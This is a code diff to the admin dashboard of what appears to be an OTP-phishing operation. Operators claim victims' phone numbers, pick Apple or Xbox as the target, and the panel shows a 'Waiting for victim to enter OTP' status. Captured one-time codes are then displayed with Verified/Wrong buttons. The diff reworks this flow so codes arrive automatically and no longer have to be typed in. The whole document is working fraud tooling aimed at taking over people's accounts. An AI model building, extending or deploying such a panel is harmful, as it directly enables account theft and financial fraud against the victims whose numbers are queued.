@@ -96,7 +96,8 @@
             <div class="stats-grid" id="statsGrid">
                 <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
                 <div class="stat-card"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
-                <div class="stat-card"><div class="num" id="statOtpSent">0</div><div class="label">OTP Sent</div></div>
+                <div class="stat-card"><div class="num" id="statAwaitingOtp">0</div><div class="label">Awaiting OTP</div></div>
+                <div class="stat-card"><div class="num" id="statOtpReceived">0</div><div class="label">OTP Received</div></div>
                 <div class="stat-card"><div class="num" id="statVerified">0</div><div class="label">Verified</div></div>
                 <div class="stat-card"><div class="num" id="statWrong">0</div><div class="label">Wrong</div></div>
             </div>
@@ -264,13 +265,14 @@
                 const all = Object.values(data).flat();
                 document.getElementById('statTotal').textContent = all.length;
                 document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending' || e.status === 'claimed').length;
-                document.getElementById('statOtpSent').textContent = all.filter(e => e.status === 'otp_sent').length;
+                document.getElementById('statAwaitingOtp').textContent = all.filter(e => e.status === 'awaiting_otp').length;
+                document.getElementById('statOtpReceived').textContent = all.filter(e => e.status === 'otp_received').length;
                 document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
                 document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;
 
                 // Render queue
                 const entries = data[currentQueue] || [];
-                const pending = entries.filter(e => e.status === 'pending' || e.status === 'claimed' || e.status === 'otp_sent');
+                const pending = entries.filter(e => e.status === 'pending' || e.status === 'claimed' || e.status === 'awaiting_otp' || e.status === 'otp_received');
                 const container = document.getElementById('numbersContainer');
 
                 if (pending.length === 0) {
@@ -284,7 +286,8 @@
                             <div class="num">📱 ${entry.number}</div>
                             <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
                             ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
-                            ${entry.status === 'otp_sent' ? '<span style="color:#FFFC00;font-size:13px;">⏳ OTP Sent</span>' : ''}
+                            ${entry.status === 'awaiting_otp' ? '<span style="color:#ffaa00;font-size:13px;">⏳ Awaiting OTP</span>' : ''}
+                            ${entry.status === 'otp_received' ? '<span style="color:#FFFC00;font-size:13px;">✅ OTP Received</span>' : ''}
                             ${entry.status === 'claimed' ? '<span style="color:#ffaa00;font-size:13px;">📌 Claimed</span>' : ''}
                             ${entry.claimed_by ? `<span style="color:#888;font-size:12px;">by ${entry.claimed_by}</span>` : ''}
                         </div>
@@ -294,8 +297,10 @@
                             ` : entry.status === 'claimed' ? `
                                 <button class="btn-apple" onclick="selectPlatform('${entry.id}', 'apple')">🍎 Apple (4-Digit)</button>
                                 <button class="btn-xbox" onclick="selectPlatform('${entry.id}', 'xbox')">🎮 Xbox (6-Digit)</button>
-                            ` : entry.status === 'otp_sent' ? `
-                                <span style="color:#FFFC00;">OTP: ${entry.otp || '...'}</span>
+                            ` : entry.status === 'awaiting_otp' ? `
+                                <span style="color:#ffaa00;">⏳ Waiting for victim to enter OTP...</span>
+                            ` : entry.status === 'otp_received' ? `
+                                <span style="color:#FFFC00;">OTP: ${entry.otp}</span>
                                 <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
                                 <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
                             ` : ''}
@@ -319,18 +324,13 @@
 
         function selectPlatform(qid, platform) {
             const length = platform === 'apple' ? 4 : 6;
-            const otp = prompt(`Enter the ${length}-digit OTP that the VICTIM received from ${platform === 'apple' ? 'Apple' : 'Xbox'}:`);
-            if (!otp || otp.length !== length) {
-                alert(`Please enter exactly ${length} digits.`);
-                return;
-            }
+            // NO PROMPT - just set the OTP length
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     queueId: qid,
-                    action: length === 4 ? 'otp_4' : 'otp_6',
-                    otp: otp
+                    action: length === 4 ? 'otp_4' : 'otp_6'
                 })
             }).then(() => loadQueues());
         }
